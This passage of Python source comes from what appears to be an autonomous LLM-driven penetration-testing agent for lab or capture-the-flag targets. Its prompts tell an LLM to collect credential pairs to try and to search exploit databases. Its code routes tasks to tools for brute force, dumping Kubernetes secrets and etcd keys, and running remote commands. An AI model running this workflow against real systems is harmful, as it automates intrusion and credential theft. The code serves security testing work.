            f"You already have knowledge_search, exploit DB, AND internet search results above.\n"
            f"Review all carefully, then decide if you need MORE specific research.\n\n"
            f"## Instructions\n"
            f"1. For WeakAuth/credential vulns: extract SPECIFIC username:password pairs\n"
            f"   from the search results. List AT LEAST 8-10 combinations to try.\n"
            f"2. If nmap_vulners found CVE IDs, look them up with cve_lookup\n"
            f"3. Search for known exploits using metasploit_search and searchsploit_search\n"
            f"4. If a PlatformDiscovery hypothesis exists (cloud API, K8s, Docker),\n"
            f"   research what OTHER services the same endpoint might expose.\n"
            f"   Multi-service platforms often run 5-10 services on one port —\n"
            f"   don't assume only one is available.\n"
            f"5. If you need more details, call additional research tools now.\n"
            f"6. When done, output a JSON summary of findings for each vuln:\n"
            f'   [{{"vuln_type": "...", "cve_ids": [...], "exploit_modules": [...],'
            f'     "key_techniques": [...], "credentials_to_try": ["user:pass", ...],'
            f'     "confidence_adjustment": 0.0}}]\n'
        )

        self._maybe_compress()
        content, tool_calls = self.llm.generate(
            prompt=_first_prompt,
            system_prompt=getattr(self, '_analyze_prompt_formatted', SYSTEM_PROMPT_ANALYZE),
            tools=research_tools,
        )

        # LLM-driven rounds (max 2 more)
        for _ in range(2):
            if not tool_calls:
                break
            for tc in tool_calls:
                tc_name = tc.get("name", "")
                tc_args = tc.get("arguments", {})
                tc_id = tc.get("id", "")
                try:
                    if tc_name in self.attack_gateway.get_tool_names():
                        result = await self.attack_gateway.call(tc_name, tc_args)
                    elif tc_name in self.recon_gateway.get_tool_names():
                        result = await self.recon_gateway.call(tc_name, tc_args)
                    elif tc_name in self.mcp_pool.get_tool_names():
                        import json as _json1
                        mcp_raw = await asyncio.wait_for(
                            self.mcp_pool.call_tool(tc_name, tc_args),
                            timeout=_MCP_TIMEOUT_S,
                        )
                        is_error = mcp_raw.get("isError", False)
                        error_text = ""
                        if is_error:
                            content_list = mcp_raw.get("content", [])
                            if content_list and isinstance(content_list[0], dict):
                                error_text = content_list[0].get("text", "")
                        result = ToolResult(
                            tool_name=tc_name,
                            success=not is_error,
                            stdout=error_text if is_error else _json1.dumps(mcp_raw, ensure_ascii=False),
                            stderr=error_text,
                            exit_code=1 if is_error else 0,
                            elapsed_ms=0,
                        )
                    else:
                        continue
                except asyncio.TimeoutError:
                    self.llm.add_tool_result(
                        tc_id, f"MCP tool '{tc_name}' timed out after {_MCP_TIMEOUT_S}s — skipping")
                    continue
                except Exception as _exc:
                    self.llm.add_tool_result(
                        tc_id, f"Tool '{tc_name}' failed: {_exc} — skipping")
                    continue
                tool_stdout = self._format_tool_feedback(tc_name, tc_args, result, "")
                self.llm.add_tool_result(tc_id, tool_stdout[:2000])

            self._maybe_compress()
            content, tool_calls = self.llm.generate(
                prompt="Continue researching. Output JSON summary when done.",
                system_prompt=getattr(self, '_analyze_prompt_formatted', SYSTEM_PROMPT_ANALYZE),
                tools=research_tools,
            )

        # ── Parse findings from final content ──
        try:
            findings = self._extract_json(content)
            if isinstance(findings, list):
                for f in findings:
                    if isinstance(f, dict) and f.get("vuln_type"):
                        vt = f["vuln_type"].lower()
                        for v in self.vulnerabilities:
                            if v.vuln_type.lower() == vt:
                                if f.get("cve_ids"):
                                    v.evidence = (v.evidence or "") + f" CVEs: {f['cve_ids']}"
                                    v.research_cves = list(f["cve_ids"])
                                if f.get("key_techniques"):
                                    v.evidence = (v.evidence or "") + f" Techniques: {f['key_techniques']}"
                                    v.research_techniques = list(f["key_techniques"])
                                if f.get("credentials_to_try"):
                                    cred_list = ", ".join(str(c) for c in f["credentials_to_try"][:15])
                                    v.evidence = (v.evidence or "") + f" Credentials: [{cred_list}]"
                                    v.tool_args = v.tool_args or {}
                                    if not v.tool_args.get("credentials"):
                                        v.tool_args["credentials"] = list(f["credentials_to_try"])
                                # Update DKG
                                for vn in self.dkg.query_nodes("Vulnerability"):
                                    if (vn.get("vuln_type") or "").lower() == vt:
                                        self.dkg.add_node("Vulnerability", vn.get("id", ""), {
                                            "research_cves": f.get("cve_ids", []),
                                            "research_techniques": f.get("key_techniques", []),
                                            "research_modules": f.get("exploit_modules", []),
                                        })
        except Exception as e:
            log.warning("Research phase findings parse failed: %s", e)

        log.info("_research_phase: complete — %d vulns researched", len(self.vulnerabilities))

    # ── Phase 1.6: Active Service Research (LLM-driven) ──────────────

    async def _active_service_research(self) -> None:
        """LLM actively researches each discovered service using exploit tools.

        Runs AFTER recon populates DKG and BEFORE analyze identifies vulns.
        The LLM can call: metasploit_search, searchsploit_search,
        go_exploitdb_search, cve_lookup to find known exploits for each
        service version discovered during scanning.
        """
        services = self.dkg.query_nodes("Service")
        if not services:
            return

        # Build service list for the LLM
        service_list = []
        for s in services[:8]:
            port = s.get("port", "?")
            protocol = s.get("protocol", "?")
            version = s.get("version", "") or s.get("banner", "")
            if version:
                service_list.append(f"  port {port}/{protocol}: {version}")

        if not service_list:
            return

        log.info("_active_service_research: LLM researching %d services", len(service_list))

        # Give LLM exploit research tools + MCP research tools
        research_tools = []
        for td in self.attack_gateway.get_tool_definitions():
            name = td.get("function", {}).get("name", "")
            if name in ("metasploit_search", "searchsploit_search",
                        "go_exploitdb_search", "cve_lookup"):
                research_tools.append(td)
        try:
            for td in self.mcp_pool.get_tool_definitions():
                name = td.get("function", {}).get("name", "")
                if any(kw in name.lower() for kw in
                       ("search", "cve", "vuln", "exploit", "code", "repo")):
                    research_tools.append(td)
        except Exception:
            pass

        prompt = (
            f"Discovered services — research each one for known exploits:\n"
            + "\n".join(service_list) + "\n\n"
            f"For EACH service version above, call metasploit_search and "
            f"searchsploit_search to find known exploits. If CVEs were found "
            f"by nmap_vulners, look them up with cve_lookup. "
            f"Output findings as JSON:\n"
            f'[{{"service": "OpenSSH 8.9p1", "exploits_found": [...], '
            f'"cves": [...], "notes": "..."}}]\n'
        )

        self._maybe_compress()
        content, tool_calls = self.llm.generate(
            prompt=prompt,
            system_prompt=getattr(self, '_analyze_prompt_formatted', SYSTEM_PROMPT_ANALYZE),
            tools=research_tools,
        )

        # Execute research tool calls (max 2 rounds)
        for _ in range(2):
            if not tool_calls:
                break
            for tc in tool_calls:
                tc_name = tc.get("name", "")
                tc_args = tc.get("arguments", {})
                tc_id = tc.get("id", "")
                if tc_name in self.attack_gateway.get_tool_names():
                    result = await self.attack_gateway.call(tc_name, tc_args)
                else:
                    continue
                tool_stdout = self._format_tool_feedback(tc_name, tc_args, result, "")
                self.llm.add_tool_result(tc_id, tool_stdout[:2000])

            self._maybe_compress()
            content, tool_calls = self.llm.generate(
                prompt="Continue researching. Output JSON summary when done.",
                system_prompt=getattr(self, '_analyze_prompt_formatted', SYSTEM_PROMPT_ANALYZE),
                tools=research_tools,
            )

        # Store findings in DKG Service nodes
        if content:
            try:
                findings = self._extract_json(content)
                if isinstance(findings, list):
                    for f in findings:
                        if isinstance(f, dict):
                            svc_name = f.get("service", "")
                            for s in services:
                                ver = s.get("version", "") or s.get("banner", "")
                                if svc_name and svc_name in ver:
                                    self.dkg.add_node("Service", s.get("id", ""), {
                                        "research_exploits": f.get("exploits_found", []),
                                        "research_cves": f.get("cves", []),
                                        "research_notes": f.get("notes", ""),
                                    })
            except Exception as e:
                log.warning("Active service research parse failed: %s", e)

        log.info("_active_service_research: complete")

    # ── Post-Auth Exploration ───────────────────────────────────────

    def _extract_links_from_html(self, html: str, base_url: str) -> list[str]:
        """Extract and normalize all navigable links from HTML body."""
        from urllib.parse import urljoin as _uj, urlparse as _up
        import re as _re

        links: set[str] = set()
        pb = _up(base_url)
        origin = f"{pb.scheme}://{pb.netloc}"

        for pattern in [r'href=["\']([^"\']+)["\']', r'''action=["']([^"']+)["']''',
                        r'src=["\']([^"\']+)["\']']:
            for m in _re.findall(pattern, html, _re.I):
                href = m.strip()
                if href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                    continue
                absolute = _uj(base_url, href)
                if absolute.startswith(origin):
                    frag = absolute.find('#')
                    if frag > 0:
                        absolute = absolute[:frag]
                    links.add(absolute)
        return list(links)

    def _extract_ids_from_url(self, url: str, patterns: dict[str, set[int]]) -> None:
        """Extract numeric path segments as potential record IDs."""
        from urllib.parse import urlparse as _up

        segments = _up(url).path.split("/")
        for i, seg in enumerate(segments):
            if seg.isdigit():
                val = int(seg)
                if val < 1:
                    continue
                ps = list(segments)
                ps[i] = "{}"
                pattern = "/".join(ps)
                patterns[pattern].add(val)

    def _extract_ids_from_body(self, body: str, base_url: str, patterns: dict[str, set[int]]) -> None:
        """Scan HTML body for numeric IDs in hrefs, data-* attrs, and JS strings."""
        from urllib.parse import urljoin as _uj
        import re as _re

        base_norm = base_url.rstrip("/")

        # 1. Standard href links
        for m in _re.findall(r'href=["\']([^"\']+)["\']', body):
            absolute = _uj(base_url, m)
            if absolute.startswith(base_norm):
                self._extract_ids_from_url(absolute, patterns)

        # 2. data-*-id and data-*-resource attributes (e.g. data-order-id="300123")
        for attr, vid in _re.findall(
            r'data-([\w-]*(?:id|order|user|account|resource|item|record)[\w-]*)\s*=\s*["\'](\d+)["\']',
            body, _re.I,
        ):
            val = int(vid)
            if val < 1:
                continue
            resource = _re.sub(r'[-_]?(?:id|order|user|account|resource|item|record)$', '', attr, flags=_re.I)
            if resource:
                for suffix in ("", "/receipt", "/archive", "/view", "/edit", "/detail"):
                    patterns[f"/{resource}/{{}}{suffix}"].add(val)
            if "order" in attr.lower():
                for suffix in ("", "/receipt", "/archive"):
                    patterns[f"/order/{{}}{suffix}"].add(val)

        # 3. JS URL fragments: extract path segments around concatenations
        # Pattern: '/order/' + thing + '/receipt' → /order/{}/receipt
        for m in _re.findall(
            r"""['"](/[\w/]+/)['"]\s*\+\s*\w+\s*\+\s*['"](/[\w/]*)['"]""",
            body,
        ):
            prefix, suffix = m
            patterns[f"{prefix}{{}}{suffix}"].update({})  # register pattern

        # 4. Path-like strings in JS/JSON: "/order/300123/receipt"
        for m in _re.findall(r"""['"](/[\w/]*/\d{2,}/[\w/]*)['"]""", body):
            self._extract_ids_from_url(_uj(base_norm, m), patterns)

    async def _probe_endpoints(self) -> str:
        """Probe each known endpoint with sample requests and capture responses.

        Returns a formatted string for the analyze prompt describing what each
        endpoint actually does. Also writes sample_response to DKG Endpoint nodes.
        Uses typed EndpointInfo for parameter normalisation.
        """
        import urllib.request as _ur, json as _js

        endpoints = self.dkg.query_nodes("Endpoint")
        if not endpoints:
            return ""

        lines = ["\n## Application Behavior (probed responses)\n"]
        probed_urls: set[str] = set()

        for ep in endpoints:
            ep_info = EndpointInfo.from_dkg(ep)
            url = ep_info.url
            if not url or url in probed_urls:
                continue
            probed_urls.add(url)

            method = ep_info.method
            param_names = ep_info.params  # already normalised list
            body_format = ep_info.body_format

            result_parts = [f"**{method} {url}**"]
            if param_names:
                result_parts.append(f"  INPUT params: {', '.join(param_names)}")

            try:
                if method == "POST":
                    # Build a sample JSON body from known params
                    if not param_names:
                        param_names = ["test"]
                    sample_body = _js.dumps(
                        {p: f"sample_{p}" for p in param_names}
                    ).encode()
                    req = _ur.Request(url, data=sample_body, method="POST",
                                     headers={"Content-Type": "application/json"})
                else:
                    # GET: if endpoint has params, include a sample value
                    if param_names:
                        qs = "&".join(f"{p}=sample_{p}" for p in param_names)
                        sep = "&" if "?" in url else "?"
                        req_url = f"{url}{sep}{qs}"
                    else:
                        req_url = url
                    req = _ur.Request(req_url)

                with _ur.urlopen(req, timeout=8) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    status = resp.status
                    content_type = resp.headers.get("content-type", "")

                resp_summary = body[:500]
                if len(body) > 500:
                    resp_summary += f"... (total {len(body)} bytes)"

                # Smart extraction for HTML pages larger than 500B:
                # Without this, the LLM only sees <!DOCTYPE + <head> and
                # concludes the page is "static/blank", missing forms entirely.
                if len(body) > 500 and ("<html" in body[:200].lower() or
                                         "<!doctype" in body[:200].lower()):
                    import re as _re
                    smart_parts = []
                    # Extract <title>
                    tm = _re.search(r'<title[^>]*>([^<]+)</title>',
                                    body, _re.IGNORECASE)
                    if tm:
                        smart_parts.append(f"[TITLE] {tm.group(1).strip()}")
                    # Extract form actions and input names
                    forms = _re.findall(
                        r'<form[^>]*?action\s*=\s*[\'"]([^\'"]*)[\'"][^>]*>',
                        body, _re.IGNORECASE)
                    if forms:
                        smart_parts.append(f"[FORMS] actions: {', '.join(forms[:5])}")
                    # Extract input names
                    inputs = _re.findall(
                        r'<input[^>]*?name\s*=\s*[\'"]([^\'"]*)[\'"]',
                        body, _re.IGNORECASE)
                    if inputs:
                        smart_parts.append(f"[INPUTS] names: {', '.join(inputs[:15])}")
                    # Extract textarea names
                    textareas = _re.findall(
                        r'<textarea[^>]*?name\s*=\s*[\'"]([^\'"]*)[\'"]',
                        body, _re.IGNORECASE)
                    if textareas:
                        smart_parts.append(f"[TEXTAREAS] names: {', '.join(textareas[:5])}")
                    # Extract links (up to 10)
                    links = _re.findall(
                        r'<a[^>]*?href\s*=\s*[\'"]([^\'"]*)[\'"]',
                        body, _re.IGNORECASE)
                    if links:
                        unique_links = list(dict.fromkeys(
                            l for l in links if not l.startswith('#') and not l.startswith('javascript:')))
                        smart_parts.append(f"[LINKS] {', '.join(unique_links[:10])}")
                    # Extract text content summary (strip tags, first 300 chars)
                    text = _re.sub(r'<script[^>]*>.*?</script>', '', body,
                                   flags=_re.IGNORECASE | _re.DOTALL)
                    text = _re.sub(r'<style[^>]*>.*?</style>', '', text,
                                   flags=_re.IGNORECASE | _re.DOTALL)
                    text = _re.sub(r'<[^>]+>', ' ', text)
                    text = _re.sub(r'\s+', ' ', text).strip()
                    if text:
                        smart_parts.append(f"[TEXT] {text[:300]}")

                    if smart_parts:
                        resp_summary = (
                            f"[PAGE_SIZE {len(body)} bytes] "
                            + " | ".join(smart_parts)
                            + f"\n[RAW_PREFIX] {body[:500]}"
                        )

                result_parts.append(f"  HTTP {status} ({content_type[:40]})")
                result_parts.append(f"  Response: {resp_summary}")

                # Write sample response to DKG for sub-agent access
                existing = [n for n in self.dkg.query_nodes("Endpoint")
                           if n.get("url", "") == url]
                if existing:
                    self.dkg.update_node(existing[0]["id"], {
                        "sample_status": status,
                        "sample_response": resp_summary,
                        "sample_content_type": content_type,
                    })

                # Detect interesting behavior
                if status == 500:
                    result_parts.append("  NOTE: endpoint returns 500 — backend IS processing input")
                elif body_format == "json" or content_type.startswith("application/json"):
                    try:
                        parsed = _js.loads(body)
                        if isinstance(parsed, list):
                            result_parts.append(f"  NOTE: returns JSON array with {len(parsed)} items")
                            if len(parsed) > 0 and isinstance(parsed[0], dict):
                                out_fields = list(parsed[0].keys())[:6]
                                result_parts.append(
                                    f"  OUTPUT fields (NOT input params): {out_fields}"
                                )
                        elif isinstance(parsed, dict):
                            keys = list(parsed.keys())[:5]
                            result_parts.append(f"  NOTE: returns JSON object with OUTPUT keys: {keys}")
                    except Exception:
                        pass

            except Exception as e:
                result_parts.append(f"  ERROR: {str(e)[:150]}")

            lines.append("  ".join(result_parts))

        return "\n".join(lines) + "\n"

    def _format_vulnerability_summary(self) -> str:
        """Format vulnerability hypotheses into a compact text block for LLM prompts."""
        if not self.vulnerabilities:
            return "(none)"
        lines = []
        for i, v in enumerate(self.vulnerabilities):
            line = f"  {i+1}. [{v.vuln_type}] {v.endpoint}"
            if v.param:
                line += f" param={v.param}"
            line += f" confidence={v.confidence:.2f}"
            if v.evidence:
                line += f"\n     Evidence: {v.evidence[:200]}"
            if v.research_techniques:
                line += f"\n     Research: {'; '.join(str(t) for t in v.research_techniques[:5])}"
            if v.research_cves:
                line += f"\n     CVEs: {', '.join(str(c) for c in v.research_cves[:5])}"
            if v.suggested_tool:
                line += f"\n     Tool: {v.suggested_tool}"
                if v.tool_args:
                    line += f" args={json.dumps(v.tool_args)[:200]}"
            if v.suggested_payloads:
                line += f"\n     Payloads: {'; '.join(v.suggested_payloads[:5])}"
            lines.append(line)
        return "\n".join(lines)

    def _format_vulnerability_summary_short(self, max_items: int = 5) -> str:
        """Short format for retry prompts — one line per vuln, no evidence."""
        if not self.vulnerabilities:
            return "(none)"
        lines = []
        for v in self.vulnerabilities[:max_items]:
            line = f"- [{v.vuln_type}] {v.endpoint}"
            if v.param:
                line += f" param={v.param}"
            line += f" (confidence={v.confidence:.2f})"
            if v.suggested_tool:
                line += f" → {v.suggested_tool}"
            lines.append(line)
        return "\n".join(lines)

    # ── Dynamic Planning System ────────────────────────────────────────
    # Inspired by VulnBot's Plan-Execute-Replan architecture.
    # Plans are LLM-generated, dynamically updated after each task,
    # and persisted in DKG for cross-phase/cross-agent visibility.

    def _sanitize_plan_tools(self, tasks: list[dict]) -> None:
        """Replace blacklisted tools in-place across ALL plan tasks.

        Called after every plan generation / review / replan to ensure
        time-wasting tools (e.g. hydra_ssh_brute) never reach execution,
        regardless of which code path injected them.
        """
        # Resolve $credentials.* placeholders from DKG state
        _dkg_creds = self.dkg.query_nodes("Credential")
        _resolved_user = ""
        _resolved_pass = ""
        _resolved_host = ""
        _resolved_port = 0
        _resolved_cred_type = ""
        for c in _dkg_creds:
            if c.get("username"):
                _resolved_user = str(c.get("username"))
                _resolved_pass = str(c.get("password", "") or "")
                _resolved_host = str(c.get("host", "") or "")
                _resolved_cred_type = str(c.get("cred_type", "") or "").lower()
                _cp = c.get("port", 0)
                if _cp:
                    _resolved_port = int(_cp)
                break
        # If credential has no port, look up the SSH service port from DKG
        if not _resolved_port:
            for s in self.dkg.query_nodes("Service"):
                _svc_name = (s.get("service_name", "") or "").lower()
                if "ssh" in _svc_name or s.get("port") == 22:
                    _p = s.get("port", 0)
                    if _p and _p != 22:
                        _resolved_port = int(_p)
                        break

        # ── Protocol-aware tool validation ──
        # Build a set of VALID tools for each port discovered during bootstrap.
        # Any plan task targeting a known port with a protocol-incompatible tool
        # gets auto-corrected to the right tool or skipped.
        _PORT_VALID_TOOLS: dict[str, set[str]] = {
            "1433": {"mssql_query", "mssqlclient_query", "shell_exec"},
            "3306": {"mysql_query", "shell_exec"},
            "5432": {"psql_query", "shell_exec"},
            "6379": {"redis_cmd", "shell_exec"},
            "1521": {"oracle_query", "shell_exec"},
            "27017": {"shell_exec"},
            "11211": {"shell_exec"},
            "22":   {"ssh_exec", "ssh_key_exec", "test_credential"},
            "80":   {"curl_get", "http_post", "send_payload", "ffuf_fuzz", "hydra_http_brute", "sqlmap_test"},
            "443":  {"curl_get", "http_post", "send_payload", "ffuf_fuzz", "hydra_http_brute", "sqlmap_test"},
        }
        _PROTO_DEFAULT_TOOL: dict[str, str] = {
            "mssql": "mssqlclient_query", "mysql": "mysql_query",
            "postgres": "psql_query", "redis": "redis_cmd",
            "oracle": "oracle_query", "ssh": "ssh_exec",
            "http": "curl_get", "https": "curl_get",
        }
        # Augment with DKG service name detection
        _svc_port_to_proto: dict[str, str] = {}
        for s in self.dkg.query_nodes("Service"):
            _port = str(s.get("port", ""))
            _name = (s.get("service_name", "") or "").lower()
            if _port and not _svc_port_to_proto.get(_port):
                if "mssql" in _name or "sql server" in _name:
                    _svc_port_to_proto[_port] = "mssql"
                elif "mysql" in _name: _svc_port_to_proto[_port] = "mysql"
                elif "postgres" in _name: _svc_port_to_proto[_port] = "postgres"
                elif "redis" in _name: _svc_port_to_proto[_port] = "redis"
                elif "oracle" in _name: _svc_port_to_proto[_port] = "oracle"
                elif "ssh" in _name: _svc_port_to_proto[_port] = "ssh"
                elif "http" in _name: _svc_port_to_proto[_port] = "http"

        for t in tasks:
            if not isinstance(t, dict):
                continue
            tool = str(t.get("tool", "")).strip()

            # ── Post-generation tool inference ─────────────────────
            # When the plan LLM leaves tool empty, infer the correct
            # dedicated tool from the DKG service name.  This prevents
            # the execution LLM from defaulting to shell_exec for tasks
            # that have a clearly matching service (etcd, K8S, etc.).
            if not tool:
                _instr = (t.get("instruction", "") or "").lower()
                for _svc in self.dkg.query_nodes("Service"):
                    _svc_name = (_svc.get("service_name", "") or "").lower()
                    _svc_port = str(_svc.get("port", ""))
                    if not _svc_name:
                        continue
                    # Build params from DKG service data
                    _svc_params: dict = {}
                    if _svc_port:
                        _ep = f"localhost:{_svc_port}"
                        _svc_params["host"] = "localhost"
                        _svc_params["port"] = int(_svc_port)
                    if "etcd" in _svc_name:
                        # Pick most specific tool: key listing vs value reading
                        if any(kw in _instr for kw in ("key", "enum", "list", "all", "prefix")):
                            tool = "k8s_etcd_keys"
                        else:
                            tool = "etcdctl_get"
                        _svc_params["endpoint"] = f"https://{_ep}"
                        _svc_params["insecure"] = True
                        _svc_params["key"] = "/"
                    elif "kubernetes-admission" in _svc_name:
                        # Admission webhook — HTTP JSON API, not kubectl
                        tool = "send_payload"
                        _svc_params["url"] = f"https://{_ep}"
                    elif "kubernetes" in _svc_name:
                        if "secret" in _instr:
                            tool = "kubectl_get_secrets"
                        elif "pod" in _instr:
                            tool = "kubectl_get_pods"
                        else:
                            tool = "kubectl_auth_check"
                    elif "kubelet" in _svc_name:
                        if "exec" in _instr or "command" in _instr:
                            tool = "k8s_kubelet_exec"
                        else:
                            tool = "kubelet_probe"
                    elif "tiller" in _svc_name:
                        tool = "helm"
                        # Build --host from DKG service data:
                        # svc_name="k8s-tiller-deploy", banner="...tiller-deploy.kube-system.svc.cluster.local"
                        _tiller_host = (_svc.get("k8s_cluster_ip", "") or "")
                        _tiller_ns = (_svc.get("k8s_namespace", "") or "kube-system")
                        _tiller_name = (_svc_name.replace("k8s-", "") if _svc_name.startswith("k8s-") else _svc_name)
                        if _tiller_name and _tiller_ns:
                            _tiller_host = f"{_tiller_name}.{_tiller_ns}:44134"
                        _svc_params["command"] = (
                            f"--host {_tiller_host} ls --all"
                            if _tiller_host else "ls --all"
                        )
                    # Merge inferred params into existing params (don't overwrite)
                    if _svc_params:
                        _existing = dict(t.get("params", {}) if isinstance(t.get("params"), dict) else {})
                        for _k, _v in _svc_params.items():
                            _existing.setdefault(_k, _v)
                        t["params"] = _existing
                    if tool:
                        t["tool"] = tool
                        break  # first matching service wins

            _params = t.get("params", {}) if isinstance(t.get("params"), dict) else {}
            _task_port = str(_params.get("port", ""))
            # LLM sometimes puts port in host (e.g. "localhost:10119")
            if not _task_port:
                _host = str(_params.get("host", _params.get("target", "")))
                if ":" in _host:
                    _maybe_port = _host.rsplit(":", 1)[-1]
                    if _maybe_port.isdigit():
                        _task_port = _maybe_port

            # Determine the valid tool set for this task's target port
            _valid_tools: set[str] | None = None
            if _task_port and _task_port in _PORT_VALID_TOOLS:
                _valid_tools = _PORT_VALID_TOOLS[_task_port]
            elif _task_port and _task_port in _svc_port_to_proto:
                _proto = _svc_port_to_proto[_task_port]
                # Non-standard ports need protocol-based tool validation
                if _proto == "ssh":
                    _valid_tools = {"test_credential", "ssh_exec", "ssh_key_exec", "hydra_ssh_brute", "shell_exec"}
                elif _proto == "mssql":
                    _valid_tools = {"mssql_query", "mssqlclient_query", "shell_exec"}
                elif _proto in ("mysql", "mariadb"):
                    _valid_tools = {"mysql_query", "shell_exec"}
                elif _proto == "postgres":
                    _valid_tools = {"psql_query", "shell_exec"}
                elif _proto == "redis":
                    _valid_tools = {"redis_cmd", "shell_exec"}
                elif _proto == "oracle":
                    _valid_tools = {"oracle_query", "shell_exec"}
                else:
                    _valid_tools = _PORT_VALID_TOOLS.get(
                        _task_port, set()
                    )

            # If tool is incompatible with the target port, correct or skip
            if _valid_tools is not None and tool and tool not in _valid_tools:
                # Try to find a compatible replacement
                _proto = _svc_port_to_proto.get(_task_port, "")
                _replacement = _PROTO_DEFAULT_TOOL.get(_proto, "")
                if _replacement and _replacement in _valid_tools:
                    if _replacement != tool and "query" in _replacement:
                        _params.setdefault("query", "SELECT 1 AS test")
                    t["tool"] = _replacement
                    t["instruction"] = (
                        t.get("instruction", "")
                        + f" [auto-corrected: {tool}→{_replacement} (protocol mismatch for port {_task_port})]"
                    )
                    tool = _replacement
                elif tool in {"test_credential", "ssh_exec", "ssh_key_exec", "hydra_ssh_brute"}:
                    # SSH tools on non-SSH ports → skip, can't fix
                    t["status"] = "skipped"
                    continue

            if tool in self._BLACKLISTED_TOOLS:
                replacement = self._BLACKLISTED_TOOLS[tool]
                if not replacement:
                    # Tool binary not available — skip the task entirely
                    t["status"] = "skipped"
                else:
                    t["tool"] = replacement
                    t["instruction"] = (
                        t.get("instruction", "")
                        .replace("brute force", "authenticate")
                        .replace("brute-force", "authenticate")
                        .replace("Brute force", "Authenticate")
                    )
                    # Convert params for tool replacement
                    _rep_params = t.get("params", {})
                    if isinstance(_rep_params, dict):
                        if tool == "hydra_ssh_brute" and replacement == "ssh_exec":
                            _target = str(_rep_params.get("target", ""))
                            if ":" in _target:
                                _parts = _target.rsplit(":", 1)
                                _rep_params["host"] = _parts[0]
                                try:
                                    _rep_params["port"] = int(_parts[1])
                                except ValueError:
                                    _rep_params["port"] = 22
                            else:
                                _rep_params["host"] = _target
                            _rep_params.pop("target", None)
                            t["params"] = _rep_params
            # Block raw SSH in shell_exec — running "ssh" or "sshpass"
            # triggers an interactive password prompt that hangs the tool.
            # Scan the ENTIRE command for ssh/sshpass — LLMs often embed
            # them inside compound commands (cd X && ssh Y, bash -c 'ssh Y').
            if tool == "shell_exec":
                _cmd = str(t.get("params", {}).get("command", ""))
                # Find the last standalone "ssh" or "sshpass" in the command
                # — the actual invocation, skipping comments and echo.
                _ssh_match = list(re.finditer(
                    r'\b(sshpass|ssh)\b(?![-\w]*=)', _cmd
                ))
                if _ssh_match:
                    # Take the LAST match — most likely the actual ssh call
                    _m = _ssh_match[-1]
                    _ssh_start = _m.start()
                    # Skip if preceded by echo/printf/which/apt/install/#
                    _prefix = _cmd[:_ssh_start].strip()
                    _prefix_last_line = _prefix.rsplit("\n", 1)[-1].rsplit(";", 1)[-1].rsplit("&&", 1)[-1].rsplit("||", 1)[-1]
                    _pre_words = _prefix_last_line.strip().split()
                    if _pre_words and _pre_words[-1] in (
                        "echo", "printf", "which", "apt", "apt-get", "yum",
                        "man", "help", "whereis", "type", "#",
                    ):
                        pass  # false positive — informational command
                    else:
                        # Parse arguments starting from the ssh/sshpass token
                        _rest = _cmd[_ssh_start:]
                        _cmd_words = _rest.split()
                        _ssh_host = ""
                        _ssh_port = 22
                        _ssh_user = ""
                        _ssh_cmd = "id"
                        _ssh_pass = ""
                        _is_sshpass = (_cmd_words[0] == "sshpass")
                        for i, w in enumerate(_cmd_words):
                            if w in ("sshpass", "ssh", "ssh-copy-id") and i == 0:
                                continue
                            if w == "-p" and i + 1 < len(_cmd_words):
                                if _is_sshpass and i == 1:
                                    _ssh_pass = _cmd_words[i + 1]
                                else:
                                    try:
                                        _ssh_port = int(_cmd_words[i + 1])
                                    except ValueError:
                                        pass
                            elif w == "-l" and i + 1 < len(_cmd_words):
                                _ssh_user = _cmd_words[i + 1]
                            elif "@" in w and not w.startswith("-"):
                                _user_host = w.split("@")
                                _ssh_user = _ssh_user or _user_host[0]
                                _ssh_host = _user_host[-1]
                            elif w == "-i":
                                pass  # key-based — skip, can't auto-convert
                        if _ssh_host:
                            t["tool"] = "ssh_exec"
                            _new_params: dict = {
                                "host": _ssh_host,
                                "port": _ssh_port,
                                "username": _ssh_user or "root",
                                "password": _ssh_pass,
                                "command": _ssh_cmd,
                            }
                            t["params"] = _new_params
                            t["instruction"] = (
                                t.get("instruction", "")
                                + " [auto-corrected: shell_exec→ssh_exec (SSH in shell_exec triggers interactive prompt)]"
                            )

            # ssh_exec is for simple remote commands, not local scripts.
            # Redirect when the instruction describes credential testing
            # or the command contains scripts (newlines, sshpass, python).
            if tool == "ssh_exec":
                _instr = str(t.get("instruction", "")).lower()
                _cmd = str(t.get("params", {}).get("command", ""))
                _is_cred_test = any(kw in _instr for kw in (
                    "batch-test", "batch test",
                    "brute force", "brute-force", "dictionary", "wordlist",
                ))
                _is_script = "\n" in _cmd or "sshpass" in _cmd or len(_cmd) > 500
                if _is_cred_test or _is_script:
                    t["tool"] = "shell_exec"
                    t["params"] = {"command": _cmd}
                    t["instruction"] = (
                        t.get("instruction", "")
                        + " [auto-corrected: ssh_exec→shell_exec (credential testing must run locally)]"
                    )

            # Block CVE-2024-6387 (regreSSHion) tasks — this is a complex
            # pre-auth race condition exploit that requires ~10,000 attempts
            # and specific glibc versions.  It wastes 5+ minutes on every SSH
            # scenario and almost never succeeds in container environments.
            _instr = str(t.get("instruction", "")).lower()
            if "cve-2024-6387" in _instr or "regresshion" in _instr:
                t["status"] = "skipped"
                continue

            # Block local filesystem access via file:// URLs — flag must come
            # from the TARGET, not from searching the DARWIN host filesystem.
            _params = t.get("params", {})
            if isinstance(_params, dict):
                _url_val = str(_params.get("url", ""))
                if _url_val.startswith("file://") and t.get("tool", "") in ("curl_get", "http_post"):
                    t["status"] = "skipped"
                    continue
            # Resolve $credentials.* placeholders in task params
            if isinstance(_params, dict):
                _has_cred_ref = any(
                    isinstance(v, str) and "$credentials." in v
                    for v in _params.values()
                )
                if _has_cred_ref:
                    if _resolved_user:
                        for _key, _val in list(_params.items()):
                            if isinstance(_val, str) and "$credentials." in _val:
                                _params[_key] = _val.replace(
                                    "$credentials.username", _resolved_user
                                ).replace(
                                    "$credentials.password", _resolved_pass
                                )
                        # Also inject host/port from credential — these
                        # are commonly wrong (default port 22, etc.) when
                        # the plan LLM lacks service context at gen time.
                        if _resolved_host and not str(_params.get("host", "")).strip():
                            _params["host"] = _resolved_host
                        if _resolved_port and int(_params.get("port", 0) or 0) in (0, 22):
                            _params["port"] = _resolved_port
                    else:
                        # No credentials available — task can't run
                        t["status"] = "skipped"
                        continue

        # ── Cascade skip to dependent tasks ──────────────────────
        # When a task is blacklisted or protocol-incompatible and
        # gets skipped, all tasks that depend on it can never run.
        # Mark them skipped too, in topological order, so the LLM
        # doesn't waste iterations waiting for impossible dependencies.
